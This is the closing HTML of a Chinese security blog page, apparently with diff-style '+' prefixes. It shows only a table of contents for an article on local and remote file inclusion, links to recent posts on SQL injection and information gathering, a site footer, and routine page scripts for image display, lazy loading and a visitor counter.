+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B"><span class="toc-text">一、简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%87%BD%E6%95%B0"><span class="toc-text">二、文件包含函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%88%86%E7%B1%BB"><span class="toc-text">三、文件包含分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E2%80%93LFI"><span class="toc-text">1、本地文件包含–LFI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E3%80%81%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E2%80%93RFI"><span class="toc-text">2、远程文件包含–RFI</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E8%B7%AF%E5%BE%84"><span class="toc-text">四、常见的敏感信息路径</span></a></li></ol>
+    </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header">
+    <i 
+      class="iconfont icon-wenzhang_huaban" 
+      style="padding-right: 2px;">
+    </i>最近文章
+  </div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-06</div>
+        <a href="/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><div class="recent-posts-item-content">信息收集</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/Access%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">Access注入</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/MSSQL%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">MSSQL注入</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/Mysql%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">Mysql注入</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+          </div>
+        </div>
+      </div>
+    </div>
+     
+    <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>
+          Copyright ©
+          
+            2020 -
+          
+          2021
+        </span>
+        &nbsp;
+        <a 
+          href="/" 
+          class="footer-link">
+          沉墨的小小技术圈
+        </a>
+      </div>
+    </div>
+
+    
+    
+    
+      <div class="BbeiAn-info">
+        <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">皖ICP备2021010523号-1 </a>
+      </div>
+      
+        <div class="BbeiAn-info">
+          <span style="padding-left: 25px;background: url(/img/beian.png) no-repeat left center"></span>
+          <a target="_blank" rel="noopener" href="http://www.beian.gov.cn/portal/recordQuery ">皖公网安备 34012202341035号
+          </a>
+          <br />
+        </div>
+      
+    
+    
+      <div class="footer-dsc">
+        
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+        
+          <span>&nbsp;|&nbsp;</span>
+        
+        
+          本站总访客数<span id="busuanzi_value_site_uv"></span>次
+        
+      </div>
+      
+    
+</footer> 
+    
+  <a 
+    role="button" 
+    id="scrollbutton" 
+    class="basebutton" 
+    aria-label="回到顶部">
+    <i class="iconfont icon-arrowleft button-icon"></i>
+  </a>
+
+<a 
+  role="button" 
+  id="menubutton" 
+  class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="popbutton" 
+  class="basebutton" 
+  aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="darkbutton" 
+  class="basebutton darkwidget" 
+  aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="searchbutton" 
+  class="basebutton searchwidget" 
+  aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a> 
+     
+     
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
+     
+     
+    <script src="/js/main.js"></script> 
+    
+      <script> 
+        loadScript('/js/lib/busuanzi.min.js') 
+      </script>
+     
+    
+      <script>
+        var addLazyload = function () {
+          var observer = lozad('.lozad', {
+            load: function (el) {
+              el.srcset = el.getAttribute('data-src')
+            },
+            loaded: function (el) {
+              el.classList.add('loaded')
+            },
+          })
+          observer.observe()
+        }
+      </script>
+      <script>
+        loadScript('/js/lib/lozad.min.js', addLazyload)
+      </script>
+     
+    
+    
+      <script>
+        setTimeout(() => {localSearch("search.json")}, 0)
+      </script>
+    
+  </body>
+</html>
